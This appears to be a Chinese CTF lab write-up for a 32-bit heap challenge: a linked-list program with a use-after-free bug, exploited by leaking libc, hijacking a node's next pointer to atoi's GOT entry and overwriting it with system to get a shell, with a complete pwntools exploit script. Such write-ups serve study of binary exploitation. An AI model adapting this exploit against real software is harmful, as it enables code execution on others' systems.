---
title: 程序实现单链表上的一个漏洞
tags:
  - UAF
  - lab
  - 篡改got表
categories: 私房菜
password: he13716649461
abbrlink: 378831b9
---

本题的libc版本为2.23

### 保护策略：

![image-20221116182950158](https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202211161829363.png)



### 程序分析：

本题程序实现了一个单链表，具有增删改和打印的功能。

<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202211161830419.png" alt="image-20221116183021361" style="zoom:50%;" />

漏洞点是UAF，而本题申请的堆块大小是由我们输入数据的size决定的，这就意味着肯定是没溢出的。由于本题是自己实现的单链表，所以每次add的时候程序还会申请一个堆块(size为0x18)作为节点，头指针在bss段上存储，叫做list指针。

而节点的结构如下:

```
struct node
{
	int number #存储的gtid
	void* ptr  #指向了存储name的用户堆块
	void* next #指向了下一个节点
	void* nickname #指向了存储nickname的用户堆块
}

```



### 利用思路：

#### 获取libc地址

由于用户堆块的大小取决于输入的数据，加上UAF和show函数，就可以去泄露libc。先申请一个大于fastbin的堆块，将其释放进入unsorted bin后获取libc地址

### 篡改got表

这道题我们可以把节点堆块看作控制堆块(毕竟里面存放了用户堆块的指针)，因此先申请两个大小不为0x18的堆块将其释放掉，这样fastbin的0x18链上就会有两个0x18大小的堆块。我们再申请一个0x18的堆块，这样两个0x18的堆块就申请回来了，一个当做了用户堆块，一个当做了节点堆块。

我们让原本的第一个节点堆块作为我们刚刚申请的用户堆块，因此可以往里面写入数据从而去控制节点堆块里存的next指针，我们将next指针改为atoi函数的got表，这样atoi函数的got表就会被当做第二个节点，最后编辑二号节点中的number篡改的就是atoi的got表，劫持为system即可。



### 注意的点：

1. 往atoi的got表写入system的地址时，由于atoi函数只能返回int类型的值，这个范围要小于0x7fffffff，而32位的libc地址是0xf7开头的大于这个数值，因此正常无法写进去。此处需要通过输入负数，这样写到内存里会存成补码，从而去写进去一个libc地址。

2. 劫持了atoi的got表system地址后，再次遇见的第一个atoi函数时，只能写入三个字节的数据(如下)

   ![image-20221116202947384](https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202211162029457.png)

​	所以最后的参数写入sh\x00



### EXP：

```py
from tools import *
context.log_level='debug'
p,e,libc=load("a")
def add(name,tid):
    p.sendlineafter("5. Exit\n\n",str(1))
    p.sendlineafter("- Name?\n",name)
    p.sendlineafter("- GTID?\n",str(tid))

def edit(index,a,b,c,name='a',tid='1',nickname='a'):
    p.sendlineafter("5. Exit\n\n",str(3))
    p.sendlineafter("- Give me an index to choose\n",str(index))
    if a=='y':
        p.sendlineafter("- Wish to change name?(y/n)\n","y")
        p.sendlineafter("- Name?\n",name)
    else:
        p.sendlineafter("- Wish to change name?(y/n)\n","n")
    
    if b=='y':
        p.sendlineafter("- Wish to change gtid?(y/n)\n","y")
        p.sendlineafter("- GTID?\n",str(tid))
    else:
        p.sendlineafter("- Wish to change gtid?(y/n)\n","n")
    
    if c=='y':
        p.sendlineafter("- Wish to change nickname?(y/n)\n","y")
        p.sendlineafter("- Nickname?\n",nickname)
    else:
        p.sendlineafter("- Wish to change nickname?(y/n)\n","n")

def delete(index):
    p.sendlineafter("5. Exit\n\n",str(2))
    p.sendlineafter("- Give me an index to choose",str(index))
    
def show():
    p.sendlineafter("5. Exit\n\n",str(4))
   
add('a'*0x60,1)
add(b'b'*0x20+p32(0x40),2)
add(b'c'*0x20+p32(0x40),3)

delete(1)
delete(0)
debug(p,0x08048EB2,0x08048EB9,0x08048EC0,0x08048EC7,0x08048907,0x08048BB2) 
show()
libc_base=recv_libc()-0x1b37b0
log_addr('libc_base')
sys_addr=libc_base+libc.symbols['system']
add(p32(0xdeadbeef)*2+p32(e.got['atoi'])+p32(0x0804B058),2)
log_addr('sys_addr')
edit(1,'y','y','n','u'*0x4,sys_addr-0xffffffff-1)
p.sendlineafter("5. Exit\n\n",'sh\x00')
p.interactive()
```

![image-20221116205259219](https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202211162053739.png)



### 题目附件：

链接: https://pan.baidu.com/s/1KJo0VF_Ibjfl6I1P_14cDw?pwd=jnic 提取码: jnic 